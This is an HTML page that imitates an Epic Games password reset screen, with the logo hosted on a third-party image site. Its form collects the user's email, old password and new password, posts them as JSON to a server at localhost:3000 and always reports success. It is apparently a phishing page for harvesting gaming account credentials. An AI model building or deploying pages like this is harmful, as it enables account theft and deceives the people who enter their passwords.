<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games Password Reset</title>
    <link rel="stylesheet" href="epicgames-html-password.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        body {
            background-color: #181818;
            color: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #242424;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
            width: 400px;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 100px; /* Adjusted size */
            height: auto;
        }

        .MuiTypography-root.MuiTypography-body1.mui-o497ds {
            font-size: 22px;
            font-weight: 500;
            text-align: center;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
            color: #f5f5f5;
        }

        .form-group {
            margin-bottom: 15px;
            position: relative;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #ddd;
            font-size: 14px;
            font-weight: bold;
        }

        input[type="password"], input[type="email"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #444;
            border-radius: 6px;
            background-color: #333;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            outline: none;
        }

        input[type="password"]:focus, input[type="email"]:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px #007bff;
        }

        .requirements {
            margin-top: 15px;
            border: 1px solid #444;
            border-radius: 6px;
            padding: 15px;
            background-color: #2a2a2a;
            font-size: 14px;
        }

        .requirements ul {
            margin: 0;
            padding: 0 0 0 20px;
            list-style: disc;
        }

        .requirements li {
            margin-bottom: 10px;
            color: #bbb;
        }

        button {
            background: linear-gradient(90deg, #007bff, #0056b3);
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            font-size: 14px;
            letter-spacing: 0.5px;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
        }

        button:active {
            transform: translateY(1px);
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
        }

        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #1a1a1a;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
            color: #ddd;
        }

        .logo img {
            display: block;
            margin: 0 auto 20px;
            width: 150px;
        }

        .MuiTypography-root {
            text-align: center;
            font-size: 16px;
            margin-bottom: 20px;
            color: #ddd;
        }

        #successMessage {
            display: none;
            text-align: center;
            color: #28a745;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo Section -->
        <div class="logo">
            <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
        </div>

        <!-- Instructions -->
        <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
            Enter your new password for your Epic Games account.
        </div>

        <!-- Form Section -->
        <form id="resetForm">
            <!-- Email Section -->
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>
            </div>

            <!-- Old Password Section -->
            <div class="form-group">
                <label for="oldPassword">Old Password</label>
                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
            </div>

            <!-- New Password Section -->
            <div class="form-group">
                <label for="newPassword">New Password</label>
                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
            </div>

            <!-- Submit Button -->
            <button type="submit" class="submit-btn">Reset Password</button>
        </form>

        <!-- Success message (hidden by default) -->
        <div id="successMessage">
            Password Reset Successfully!
        </div>
    </div>

    <script>
        // Handle form submission with AJAX to avoid page reload
        document.getElementById('resetForm').addEventListener('submit', function(e) {
            e.preventDefault();  // Prevent the form from submitting normally

            const email = document.getElementById('email').value;
            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;

            const data = { email, oldPassword, newPassword };

            fetch('http://localhost:3000/reset-password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('resetForm').reset();  // Reset form fields
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
